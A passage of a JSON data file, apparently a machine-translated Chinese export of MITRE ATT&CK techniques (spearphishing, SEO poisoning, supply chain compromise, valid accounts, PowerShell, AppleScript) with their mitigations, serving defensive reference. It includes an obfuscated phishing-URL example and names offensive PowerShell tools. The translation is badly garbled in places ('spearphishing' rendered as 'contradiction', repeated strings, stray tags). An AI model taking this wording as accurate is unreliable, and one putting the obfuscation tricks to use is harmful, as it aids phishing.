        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.005",
    "name": "Link Target",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用可以在目标过程中可以使用的链接引用的资源。对手可以依靠单击恶意链接的用户来泄露信息（包括凭据）或获得执行，例如在恶意链接中。可以将链接用于矛盾，例如发送一封由社会工程文本的电子邮件，以哄骗用户积极单击或复制并将URL粘贴到浏览器中。在进行网络钓鱼以获取信息（如矛盾的链接中）或网络钓鱼以获得对系统的初始访问（如矛盾链接中），对手必须为spearphershishing链接设置链接目标的资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通常，链接目标的资源将是一个HTML页面，该页面可能包括一些客户端脚本，例如JavaScript，以决定将哪些内容用于用户。对手可能会克隆合法的站点作为链接目标，这可以包括克隆合法网络服务或组织登录页面的登录页面，以期在Spearpherphishishing Link期间收获证书。对手也可以上传恶意软件，并将链接目标点指向恶意软件，以供用户下载/执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在收购基础架构（域）期间购买类似于合法域（EX：同型象形文字，错别字，顶级域等）的域名，以帮助促进恶意链接。也可以使用链接缩短服务。对手也可以在平台上使用的服务提供商上使用免费或付费帐户来托管链接目标，同时利用这些提供商的广泛信任的域，以避免被阻止。最后，对手可以利用行星际文件系统（IPF）的分散性质来托管难以删除的链接目标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1608.006",
    "name": "SEO Poisoning",
    "tactics": [
      {
        "id": "TA0042",
        "name": "Resource Development"
      }
    ],
    "technique": "Stage Capabilities",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会毒害影响搜索引擎优化（SEO）的机制，以进一步吸引对潜在受害者的分期能力。搜索引擎通常会根据购买的广告以及网站的排名/得分/声誉来显示结果，由其网络爬网和算法计算出来。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了帮助促进妥协的折衷方案，对手可能会出现明确操纵SEO排名的内容，以促进在搜索引擎中托管其恶意有效载荷（例如开车目标）的站点。中毒SEO排名可能涉及各种技巧，例如填充关键字（包括隐藏文本的形式）到折磨的地点中。这些关键字可能与预期受害者的兴趣/浏览习惯以及更广泛，更时令的流行话题有关（例如，选举，趋势新闻）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以购买或植物传入的链接，以提高网站的相关性和声誉。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SEO中毒还可以与回避重定向和其他掩饰机制相结合（例如测量鼠标运动或基于浏览器用户代理，用户语言/本地化设置或HTTP标头服务的内容），以喂养SEO输入，同时避免对防守者进行检查。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1056",
        "name": "前弹力",
        "description": [
          [
            {
              "type": "text",
              "content": "该技术无法通过预防控制措施轻松减轻，因为它基于在企业防御和控制范围之外执行的行为。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1566.001",
    "name": "Spearphishing Attachment",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Phishing",
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会发送带有恶意依恋的带状网示电子邮件，以试图访问受害者系统。矛盾的附件是矛盾的特定变体。Spearphending附件与其他形式的Spearphenthing不同，因为它采用了电子邮件中附加的恶意软件的使用。各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，对手将文件附加到矛盾的电子邮件中，通常依靠用户执行来获得执行。矛盾的钓鱼也可能涉及社会工程技术，例如摆姿势作为可信赖的来源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "附件有许多选项，例如Microsoft Office文档，可执行文件，PDF或存档文件。打开附件（并可能单击过去的保护措施）后，对手的有效载荷会利用漏洞或直接在用户系统上执行。矛盾电子邮件的文本通常会试图给出一个合理的原因，使文件应打开，并可以解释如何绕过系统保护以进行此操作。该电子邮件还可能包含有关如何解密附件（例如zip文件密码）的说明，以逃避电子邮件边界防御。对手经常操纵文件扩展名和图标，以使附件的可执行文件似乎是文档文件，或者利用一个应用程序的文件似乎是其他文件的文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒也可以自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "网络入侵预防系统和旨在扫描和删除恶意电子邮件附件的系统可用于阻止活动。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "默认情况下，不应通过电子邮件传输未知或未使用的附件，作为防止某些向量的最佳实践，例如.scr，.exe，.pif，.cpl等。某些电子邮件扫描设备可以打开和分析被压缩和分析格式，例如zip和rar，可用于隐藏恶意附件。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "使用反企业和电子邮件身份验证机制根据发件人域（使用SPF）的有效性检查和消息完整性（使用DKIM）过滤消息。在组织中启用这些机制（通过诸如DMARC之类的策略）可以使接收者（Intra-Org和Cross域）执行类似的消息过滤和验证。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以培训用户，以识别社会工程技术和矛盾的电子邮件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1566.002",
    "name": "Spearphishing Link",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Phishing",
    "version": "2.5",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会发送带有恶意链接的矛盾的电子邮件，以试图访问受害者系统。带有链接的矛盾是矛盾的特定变体。它与其他形式的矛盾钓鱼不同，因为它采用了使用链接来下载电子邮件中包含的恶意软件，而不是将恶意文件附加到电子邮件本身上，以避免使用可能检查电子邮件附件的防御措施。矛盾的钓鱼也可能涉及社会工程技术，例如摆姿势作为可信赖的来源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，恶意电子邮件包含链接。通常，链接将伴随社会工程文本，并要求用户积极单击或复制URL并粘贴到浏览器中，以利用用户执行。访问的网站可能会使用漏洞利用损害网络浏览器，或者将提示用户根据电子邮件的借口下载应用程序，文档，zip文件，甚至可执行文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能还包括旨在直接与电子邮件读取器交互的链接，包括旨在直接利用最终系统的嵌入式图像。此外，对手可能会使用看似良性的链接，这些链接滥用特殊角色与模仿合法网站（称为“ IDN同型攻击”）。也可以通过利用URL架构中的怪癖来使URL变得混淆，例如接受基于整数或十六进制的主机名格式，以及在“@”符号之前自动丢弃文本：例如，"
        },
        {
          "type": "code",
          "content": " hxxp：///google.com@1157586937 "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以利用链接执行同意网络钓鱼，通常使用OAuth 2.0请求URL，当用户接受时，这些URL提供了恶意应用程序的权限/访问权限，从而使对手可以窃取应用程序访问权限令牌。这些被盗的访问令牌允许对手通过API调用代表用户执行各种操作。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "审计申请及其许可以确保获得数据和资源的访问受到最低特权的必要性和原则的限制。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "确定某些可用于矛盾的网站是否需要用于业务运营，并考虑阻止访问如果无法很好地监控活动或构成重大风险。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "使用反企业和电子邮件身份验证机制根据发件人域（使用SPF）的有效性检查和消息完整性（使用DKIM）过滤消息。在组织中启用这些机制（通过诸如DMARC之类的策略）可以使接收者（Intra-Org和Cross域）执行类似的消息过滤和验证。"
            }
          ],
          [
            {
              "type": "text",
              "content": "此外，策略可以强制执行 /安装浏览器扩展程序，以防止IDN和同型攻击。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "Azure AD管理员对用户同意不熟悉或未经验证的第三方应用程序的能力应用限制。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以对用户进行培训，以识别具有恶意链接的社会工程技术，并带有矛盾的电子邮件，其中包括与Oauth 2.0同意的网络钓鱼。此外，用户可以对他们访问的域进行视觉检查；但是，ASCII和IDN域中的同符和URL模式混淆可能会使手动检查变得困难。网络钓鱼培训和其他网络安全培训可能会在访问网站之前提高对URL的认识。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1566.003",
    "name": "Spearphishing via Service",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Phishing",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过第三方服务发送带状网示消息，以尝试访问受害者系统。矛盾通过服务是矛盾的特定变体。它与其他形式的矛盾钓鱼不同，因为它采用了第三方服务的使用，而不是直接通过企业电子邮件渠道。"
        }
      ],
      [
        {
          "type": "text",
          "content": "各种形式的矛盾形式都是针对特定个人，公司或行业的以电子方式交付的社会工程。在这种情况下，对手通过各种社交媒体服务，个人网络邮件和其他非企业受控服务发送消息。与企业相比，这些服务更有可能具有较小的标准安全政策。与大多数的矛盾钓鱼一样，目标是与目标产生融洽的关系，或以某种方式获得目标的兴趣。对手将创建虚假的社交媒体帐户和消息员工，以获取潜在的工作机会。这样做允许询问在环境中运行的服务，策略和软件的合理原因。然后，对手可以通过这些服务发送恶意链接或附件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一个常见的例子是通过社交媒体与目标建立融洽的关系，然后将内容发送到目标在其工作计算机上使用的个人网络邮件服务。这使对手可以绕过对工作帐户上的电子邮件限制，并且由于他们期望的是，目标更有可能打开文件。如果有效载荷无法按预期工作，则对手可以继续正常的通信并与目标进行解决方案，以解决如何使其工作。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒也可以自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "确定某些社交媒体网站，个人网络邮件服务或其他可用于矛盾的服务是业务运营所必需的，如果无法对活动进行良好监控或构成重大风险，则考虑阻止访问权限。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以培训用户，以识别具有恶意链接的社会工程技术和矛盾的信息。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1566.004",
    "name": "Spearphishing Voice",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Phishing",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用语音通信最终获得受害者系统的访问。矛盾的声音是矛盾的特定变体。它与其他形式的矛盾钓鱼不同，因为它采用了操纵用户通过电话或其他形式的语音通信来提供系统访问的使用。矛盾的钓鱼经常涉及社会工程技术，例如摆姿势作为可信赖的来源（例如：模仿）和/或为接收者创造紧迫感或警报。"
        }
      ],
      [
        {
          "type": "text",
          "content": "所有形式的网络钓鱼都是电子交付的社会工程。在这种情况下，对手并不是直接将恶意软件发送到受害者的恶意软件，而依靠用户执行进行交付和执行。例如，受害者可能会收到网络钓鱼消息，指示他们拨打电话号码，并指示他们访问恶意URL，下载恶意软件或在其计算机上安装可访问对手的远程管理工具（远程访问软件）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以将语音网络钓鱼与多因素身份验证请求生成相结合，以便欺骗用户泄露MFA凭据或接受身份验证提示。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "可以对用户进行培训，以识别和报告社会工程技术和长矛网络钓鱼尝试，同时也对呼叫者的身份感到怀疑和验证。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1195.001",
    "name": "Compromise Software Dependencies and Development Tools",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Supply Chain Compromise",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "最终消费者在收到数据或系统妥协的目的之前，对手可能会在收到最终消费者收到之前操纵软件依赖性和开发工具。应用程序通常取决于外部软件才能正常运行。在许多应用程序中用作依赖关系的流行开源项目可能是针对依赖用户添加恶意代码的一种手段。"
        }
      ],
      [
        {
          "type": "text",
          "content": "定位可能是特定于所需的受害者组合的，或者可以分配给广泛的消费者，但只能采取针对特定受害者的其他策略。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "应实现补丁管理过程，以检查未使用的依赖项，未受欢迎和/或以前脆弱的依赖项，不必要的功能，组件，文件和文档。"
            }
          ]
        ]
      },
      {
        "id": "M1016",
        "name": "脆弱性扫描",
        "description": [
          [
            {
              "type": "text",
              "content": "还应实施对漏洞来源的持续监视以及使用自动和手动代码审查工具的使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1195.002",
    "name": "Compromise Software Supply Chain",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Supply Chain Compromise",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "最终消费者在收到数据或系统妥协目的之前，对手可以在收到之前操纵应用程序软件。软件的供应链妥协可以通过多种方式进行，包括操纵应用程序源代码，操纵该软件的更新/分发机制，或用修改版本替换编译版本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "定位可能是特定于所需的受害者组合的，或者可以分配给广泛的消费者，但只能采取针对特定受害者的其他策略。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "应实现补丁管理过程，以检查未使用的应用程序，未经维护和/或以前脆弱的软件，不必要的功能，组件，文件和文档。"
            }
          ]
        ]
      },
      {
        "id": "M1016",
        "name": "脆弱性扫描",
        "description": [
          [
            {
              "type": "text",
              "content": "还应实施对漏洞来源的持续监视以及使用自动和手动代码审查工具的使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1195.003",
    "name": "Compromise Hardware Supply Chain",
    "tactics": [
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Supply Chain Compromise",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对于数据或系统妥协的目的，对手可能会在收到最终消费者收到的产品之前操纵产品中的硬件组件。通过在供应链中修改硬件或固件，对手可以将后门插入消费网络中，这些网络可能很难检测到，并使对手对系统具有高度的控制。硬件后门可以插入各种设备，例如服务器，工作站，网络基础架构或外围设备。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "使用受信任的平台模块技术和安全或受信任的启动过程，以防止系统完整性受到损害。检查现有的BIOS或EFI的完整性，以确定它是否容易受到修改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.001",
    "name": "Default Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得默认帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。默认帐户是一个内置的OS，例如Windows系统上的来宾或管理员帐户。默认帐户还包括其他类型的系统，软件或设备（包括AWS中的root用户帐户和kubernetes中的默认服务帐户）上的默认工厂/提供商集帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认帐户不仅限于客户端机器，还包括用于设备（例如内部，开源或商业）等设备（例如网络设备和计算机应用程序）的帐户。带有用户名和密码组合的电器对不更改安装后的组织构成了严重威胁，因为它们是对手的容易目标。同样，对手也可以利用公开披露或被盗的私钥或凭证材料来合法地通过远程服务连接到远程环境。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.002",
    "name": "Domain Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得和滥用域帐户的证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。域帐户是由Active Directory域服务管理的域帐户，在该服务域服务中，在该域的一部分中配置了访问和权限。域帐户可以涵盖用户，管理员和服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会通过各种方式（例如OS凭据转储或重复使用密码重复使用）妥协域帐户，其中一些域名具有高度特权，从而允许访问该域的特权资源。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得对手获得广泛访问的情况。除非受到严格控制并分割帐户的使用，否则请勿将用户或管理域帐户跨系统组合放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。如果获得帐户凭据，则限制整个系统的凭据重叠，以防止访问。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.003",
    "name": "Local Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得当地帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的手段。本地帐户是由组织配置的，供用户使用，远程支持，服务或单个系统或服务上的管理。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当地帐户也可能被滥用，以通过OS凭证倾销来提高特权和收获凭据。密码重复使用可能允许在网络上滥用一组机器，以进行特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审核本地帐户的许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。限制用于日常运营的本地管理员帐户的使用，这些帐户可能会使它们暴露于潜在的对手。"
            }
          ],
          [
            {
              "type": "text",
              "content": "例如，审核在Kubernetes中使用服务帐户的使用，并避免自动授予他们访问Kubernetes API（如果不需要）。实施圈量也可能有助于防止在域上重用本地管理员凭据。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.004",
    "name": "Cloud Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "云环境中的有效帐户可能会使对手能够执行动作以实现初始访问，持久性，特权升级或防御逃避。云帐户是由组织创建和配置的，供用户使用，远程支持，服务或云服务提供商或SaaS应用程序中的资源管理。云帐户可以仅存在于云中，也可以通过与其他身份源（例如Windows Active Directory）联合通过联邦来源在本地系统和云之间连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "服务或用户帐户可以通过蛮力，网络钓鱼或其他各种访问环境的方式来针对对手。联邦帐户可能是对手影响本地系统和云环境的途径。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在折衷的云帐户上创建持久的额外云凭据，以保持环境中的持久性。这些凭据也可以用于绕过安全控制，例如多因素身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云帐户还可以通过环境中的各种方式假设临时提高云访问或其他特权。在角色分配或角色假设策略中进行的错误配置可能允许对手使用这些机制来利用帐户预期范围之外的权限。此类特权帐户可用于通过云API或其他方法从在线存储帐户和数据库中收集敏感数据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "帐户使用政策",
        "description": [
          [
            {
              "type": "text",
              "content": "使用条件访问策略来阻止不合规设备或外部定义的组织IP范围的登录。"
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用不支持MFA的旧版身份验证，而需要使用现代身份验证协议。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "对云帐户，尤其是特权帐户使用多因素身份验证。这可以以多种形式（例如硬件，虚拟，SMS）实现，也可以使用管理报告功能进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保云帐户，特别是特权帐户，在网络上的所有系统中都具有复杂的独特密码。密码和访问密钥应定期旋转。如果凭据在不知情的情况下损害了凭据，这限制了时间凭据可用于访问资源。云服务提供商可能会跟踪访问密钥年龄，以帮助审核并确定可能需要旋转的密钥。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "经常查看特权云帐户许可级别，以寻找可以允许对手获得广泛访问的人，例如Azure AD中的全球管理员和特权角色管理员。这些评论还应检查是否创建了未授权的新特权云帐户。例如，在Azure Ad环境中，请求警报以通知帐户何时在不使用特权角色的情况下进行了很多天，因为这些角色可以被删除。考虑使用临时，即时（JIT）特权访问Azure AD资源，而不是永久分配特权角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用户帐户并删除那些不活动或不必要的帐户。限制用户帐户创建其他帐户的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序可以发送推送通知以验证登录名为多因素身份验证（MFA）的形式。培训用户只接受有效的推送通知并报告可疑推送通知。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.001",
    "name": "PowerShell",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用PowerShell命令和脚本进行执行。PowerShell是Windows操作系统中包含的功能强大的交互式命令行接口和脚本环境。对手可以使用PowerShell执行许多操作，包括发现信息和执行代码。示例包括"
        },
        {
          "type": "code",
          "content": " start-process "
        },
        {
          "type": "text",
          "content": " cmdlet，可用于运行可执行文件和"
        },
        {
          "type": "code",
          "content": " Invoke-command "
        },
        {
          "type": "text",
          "content": " cmdlet，该</code> cmdlet在本地或远程计算机上运行命令（尽管管理员的权限是需要使用PowerShell连接到远程系统）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PowerShell也可用于从Internet下载和运行可执行文件，该可执行文件可以从磁盘或内存中执行而无需触摸磁盘。"
        }
      ],
      [
        {
          "type": "text",
          "content": "提供许多基于Powershell的进攻测试工具，包括Empire，Powersploit，Poshc2和Psattack。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PowerShell命令/脚本也可以执行，而无需直接调用"
        },
        {
          "type": "code",
          "content": " powershell.exe "
        },
        {
          "type": "text",
          "content": "通过接口到PowerShell的基础"
        },
        {
          "type": "code",
          "content": " system.management.management.automation.automation.automation.automation.automation.automation.automation.automation.automation "
        },
        {
          "type": "text",
          "content": "通过.NET框架和Windows框架和窗口通用语言接口（CLI）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒可自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "将PowerShell执行策略设置为仅执行签名脚本。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在不需要的情况下，可能可以从系统中删除PowerShell，但是应该进行审查以评估对环境的影响，因为它可以用于许多合法目的和行政功能。"
            }
          ],
          [
            {
              "type": "text",
              "content": "禁用/限制WINRM服务，以帮助防止使用PowerShell进行远程执行。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "在适当的情况下使用应用程序控件。PowerShell受约束的语言模式可用于限制对敏感或其他危险语言元素的访问，例如用于执行任意Windows API或文件的访问（例如，"
            },
            {
              "type": "code",
              "content": " ADD-TYPE "
            },
            {
              "type": "text",
              "content": "）。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "当需要PowerShell时，请考虑将PowerShell执行策略限制为管理员。请注意，根据环境配置，有一些方法可以绕过PowerShell执行策略。"
            }
          ],
          [
            {
              "type": "text",
              "content": "PowerShell JEA（仅足够的管理）也可以用于沙盒管理，并限制管理员/用户可以通过远程PowerShell会话执行的命令。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059.002",
    "name": "AppleScript",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "Command and Scripting Interpreter",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用AppleScript执行。AppleScript是一种MACOS脚本语言，旨在通过称为AppleEvents的应用程序间插入消息来控制OS的应用程序和部分。这些AppleEvent消息可以独立发送或轻松地用AppleScript脚本脚本。这些事件可以找到打开的窗口，发送击键，并几乎在本地或远程与任何打开的应用程序进行交互。"
        }
      ],
      [
        {
          "type": "text",
          "content": "脚本可以通过<Code> osascript/path/to/script </code>或"
        },
        {
          "type": "code",
          "content": " osascript -e“ script there” "
        },
        {
          "type": "text",
          "content": "从命令行运行。除命令行外，脚本还可以通过多种方式执行，包括邮件规则，galendar.app警报和自动仪工作流程。AppleScript也可以通过将"
        },
        {
          "type": "code",
          "content": "＃！/usr/bin/osascript "
        },
        {
          "type": "text",
          "content": "添加到脚本文件的开始中，作为纯文本壳脚本执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "AppleScript不需要调用"
        },
        {
          "type": "code",
          "content": " osascript "
        },
        {
          "type": "text",
          "content": "执行。但是，它们可以通过使用MacOS本机Apis "
        },
        {
          "type": "code",
          "content": " nsapplescript "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " osascript </code "
        },
        {
          "type": "text",
          "content": "使用MacOS APIS </code> </code>来执行它们。bin/osascript </code>命令行实用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用AppleScript执行各种行为，例如与开放的SSH连接，移至远程机器，甚至向用户介绍虚假的对话框框。这些事件不能远程启动应用程序（它们可以在本地启动它们），但是如果它们已经远程运行，它们可以与应用程序进行交互。在MacOS 10.10 Yosemite及更高版本上，AppleScript具有执行本机API的能力，否则该APS需要以Mach-O二进制文件格式进行编译和执行。由于这是一种脚本语言，因此可以用来通过Python来启动更常见的技术，例如反向外壳。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
